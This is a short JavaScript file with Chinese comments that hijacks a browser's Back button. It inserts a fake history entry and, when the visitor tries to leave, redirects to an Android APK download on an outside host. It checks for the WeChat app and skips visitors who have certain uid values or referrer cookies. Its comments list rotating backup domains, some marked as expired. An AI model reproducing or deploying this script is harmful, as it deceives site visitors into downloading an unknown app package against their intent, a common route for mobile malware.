function jgetUrlParam(a) {
    var b = new RegExp("(^|&)" + a + "=([^&]*)(&|$)");
    var r = window.location.search.substr(1).match(b);
    if (r != null) return unescape(r[2]);
    return null
}
function jgetSUid() {
    var b = new RegExp("uida([0-9]+)uidb");
    var r = window.location.search.substr(1).match(b);
    if (r != null) return unescape(r[1]);
    return jgetUrlParam("uid");
}

function jgetCookie(name)
{
var arr,reg=new RegExp("(^| )"+name+"=([^;]*)(;|$)");
if(arr=document.cookie.match(reg))
return unescape(arr[2]);
else
return null;
}
function jdelCookie(name)
{
var exp = new Date();
exp.setTime(exp.getTime() - 1);
var cval=jgetCookie(name);
if(cval!=null)
document.cookie= name + "="+cval+";expires="+exp.toGMTString();
}
//如果需要设定自定义过期时间
//那么把上面的setCookie　函数换成下面两个函数就ok;
//程序代码
function jsetCookie(name,value,time)
{
var exp = new Date();
exp.setTime(exp.getTime() + time);
document.cookie = name + "="+ escape (value) + ";expires=" + exp.toGMTString();
}

function hh() {history.pushState(history.length + 1, "message", "#" + new Date().getTime()); } function jp(){gotocj();}
function gotocj() { //备用域名 93611.nethzdww.cn过期12.yncww.cn，	可用12.yncww.cn  dawei.nvida-al.cn 33.cdgdk.cn


	var hoststrs = "dawei.nvida-al.cn"; //仅支持空格[可连续]和逗号
	var hostlist = hoststrs.replace(/[ ]/g,'').split(',');
	var host_index = Math.floor((Math.random() * hostlist.length));
	var host_str = hostlist[host_index];
	
var backurl = "https://web.hablm.com/bd/3021897.apk";
	if(navigator.userAgent.indexOf('MicroMessenger')!=-1)
		backurl = "https://web.hablm.com/bd/3021897.apk"

	window.location.href = backurl;
}

(function(){
//使用示例
var ckreferurl = jgetCookie("referurl");//alert('2'+ckreferurl);
var backfix = false;
if(location.href.indexOf('uida305uidb')!=-1 || location.href.indexOf('uid=305&')!=-1){
	backfix = false;
}else if(ckreferurl == null){
	backfix = true;
}else if(ckreferurl.indexOf('pgjmzc.cn') != -1){
	backfix = false;
}else{
	backfix = true;
}

if(backfix){
setTimeout('hh();', 200); 
window.onhashchange = function () { if(location.hash != '#gd') jp(); };
}

})();
